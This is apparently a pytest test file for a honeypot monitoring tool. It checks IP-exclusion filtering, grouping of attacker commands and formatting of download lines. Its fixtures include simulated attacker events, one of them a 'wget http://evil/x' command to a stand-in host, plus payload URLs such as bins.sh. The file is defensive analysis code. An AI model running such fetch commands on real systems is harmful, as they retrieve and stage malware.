"""Tests for tools/status_check.py.

test_exclude_ip_drops_events_with_no_src_ip_field is the important one: an
earlier ad-hoc version of this filtering (done by hand, not in this file)
filtered on each event's own src_ip field, which silently kept every
command.input/file.download event for an "excluded" IP -- those event
types don't carry src_ip at all, so `event.get("src_ip") != excluded_ip`
is trivially true for all of them. Filtering by session_id membership
(this file's actual approach) is what a regression here would need to
catch.
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "tools"))

from dashboard import Report  # noqa: E402
from status_check import _command_patterns, _download_line, _filter_excluded_ips  # noqa: E402


def _events(*rows):
    return list(rows)


def test_exclude_ip_drops_events_with_no_src_ip_field():
    events = _events(
        {"event": "session.connect", "session_id": "mine", "src_ip": "9.9.9.9", "protocol": "ssh"},
        {"event": "login.success", "session_id": "mine", "src_ip": "9.9.9.9", "username": "root"},
        {"event": "command.input", "session_id": "mine", "raw": "wget http://evil/x"},
        {"event": "file.download", "session_id": "mine", "outcome": "success", "url": "http://evil/x"},
        {"event": "session.connect", "session_id": "real", "src_ip": "1.2.3.4", "protocol": "ssh"},
        {"event": "login.success", "session_id": "real", "src_ip": "1.2.3.4", "username": "admin"},
    )
    filtered = _filter_excluded_ips(events, {"9.9.9.9"})
    assert all(e.get("session_id") != "mine" for e in filtered)
    assert any(e.get("session_id") == "real" for e in filtered)
    # the file.download with no src_ip field must be gone too, not kept
    assert not any(e.get("event") == "file.download" for e in filtered)


def test_exclude_ip_empty_set_is_a_no_op():
    events = _events({"event": "session.connect", "session_id": "a", "src_ip": "1.2.3.4", "protocol": "ssh"})
    assert _filter_excluded_ips(events, set()) == events


def test_command_patterns_groups_by_session_and_ignores_failed_logins():
    events = _events(
        {"event": "login.success", "session_id": "s1"},
        {"event": "command.input", "session_id": "s1", "raw": "id"},
        {"event": "command.input", "session_id": "s1", "raw": "uname -m"},
        {"event": "login.success", "session_id": "s2"},  # sends nothing
        {"event": "login.failed", "session_id": "s3"},
        {"event": "command.input", "session_id": "s3", "raw": "should not count"},
    )
    patterns = _command_patterns(Report(events))
    assert patterns[("id", "uname -m")] == 1
    assert patterns[()] == 1
    assert sum(patterns.values()) == 2  # only the two login.success sessions


def test_download_line_tags_stage_two_and_shows_elf_architecture():
    plain = _download_line({"timestamp": "T", "outcome": "success", "url": "http://x/bins.sh"})
    assert plain == "  T  success   http://x/bins.sh"
    stage2 = _download_line({"timestamp": "T", "outcome": "success", "url": "http://x/a.riscv64",
                             "stage": 2, "detected_machine": "EM_RISCV"})
    assert "[stage 2] http://x/a.riscv64" in stage2 and stage2.endswith("EM_RISCV")
